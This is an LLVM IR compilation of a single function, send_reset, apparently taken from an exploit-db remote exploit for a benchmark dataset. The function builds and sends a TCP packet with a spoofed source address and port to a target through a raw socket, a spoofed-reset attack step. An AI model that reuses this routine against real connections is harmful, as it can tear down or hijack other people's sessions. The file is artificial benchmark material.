; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19458.c_send_reset.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19458.c_send_reset.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@spoofed_port = common dso_local global i32 0, align 4
@target_port = common dso_local global i32 0, align 4
@MESSAGE = common dso_local global i32 0, align 4
@IP_H = common dso_local global i32 0, align 4
@TCP_H = common dso_local global i32 0, align 4
@packid = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@spoofed = common dso_local global i32 0, align 4
@target = common dso_local global i32 0, align 4
@sock = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @send_reset() #0 {
  %1 = alloca [200 x i8], align 16
  %2 = load i32, i32* @spoofed_port, align 4
  %3 = load i32, i32* @target_port, align 4
  %4 = load i32, i32* @MESSAGE, align 4
  %5 = call i64 @strlen(i32 %4)
  %6 = add nsw i64 4, %5
  %7 = getelementptr inbounds [200 x i8], [200 x i8]* %1, i64 0, i64 0
  %8 = load i32, i32* @IP_H, align 4
  %9 = sext i32 %8 to i64
  %10 = getelementptr inbounds i8, i8* %7, i64 %9
  %11 = call i32 @build_tcp(i32 %2, i32 %3, i64 %6, i32 0, i32 4, i32 32000, i32 0, i32 0, i32 0, i8* %10)
  %12 = load i32, i32* @TCP_H, align 4
  %13 = load i32, i32* @packid, align 4
  %14 = add nsw i32 %13, 1
  store i32 %14, i32* @packid, align 4
  %15 = load i32, i32* @IPPROTO_TCP, align 4
  %16 = load i32, i32* @spoofed, align 4
  %17 = load i32, i32* @target, align 4
  %18 = getelementptr inbounds [200 x i8], [200 x i8]* %1, i64 0, i64 0
  %19 = call i32 @build_ip(i32 %12, i32 0, i32 %13, i32 0, i32 64, i32 %15, i32 %16, i32 %17, i32 0, i32 0, i8* %18)
  %20 = getelementptr inbounds [200 x i8], [200 x i8]* %1, i64 0, i64 0
  %21 = load i32, i32* @IPPROTO_TCP, align 4
  %22 = load i32, i32* @TCP_H, align 4
  %23 = call i32 @do_checksum(i8* %20, i32 %21, i32 %22)
  %24 = load i32, i32* @sock, align 4
  %25 = getelementptr inbounds [200 x i8], [200 x i8]* %1, i64 0, i64 0
  %26 = load i32, i32* @IP_H, align 4
  %27 = load i32, i32* @TCP_H, align 4
  %28 = add nsw i32 %26, %27
  %29 = call i32 @write_ip(i32 %24, i8* %25, i32 %28)
  ret void
}

declare dso_local i32 @build_tcp(i32, i32, i64, i32, i32, i32, i32, i32, i32, i8*) #1

declare dso_local i64 @strlen(i32) #1

declare dso_local i32 @build_ip(i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i8*) #1

declare dso_local i32 @do_checksum(i8*, i32, i32) #1

declare dso_local i32 @write_ip(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
